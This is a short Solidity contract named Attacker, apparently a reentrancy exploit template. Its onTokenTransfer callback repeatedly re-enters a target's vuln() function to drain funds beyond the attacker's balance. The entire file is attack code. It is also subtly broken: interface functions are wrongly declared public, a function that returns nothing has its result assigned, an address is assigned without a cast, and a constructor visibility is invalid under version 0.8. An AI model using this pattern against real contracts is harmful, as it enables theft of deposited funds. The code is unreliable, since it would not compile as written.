pragma solidity 0.8.7;

interface IVictim {
	function balanceOf(address) public payable;
	function deposit() public payable;
	function vuln(uint256 amount) public;
}

contract Attacker {
	IVictim private target;
	address private owner;
	uint256 private balance;
	constructor(address _target) public {
		target = _target;
		owner = msg.sender;
	}
	function exploit() external {
		balance = target.balanceOf(msg.sender);
		target.vuln(1);
	}
	function onTokenTransfer(address _sender, uint _value, bytes _data) external {
		if (balance > 0) {
			balance-=1;
			target.vuln(1);
		}
	}
}
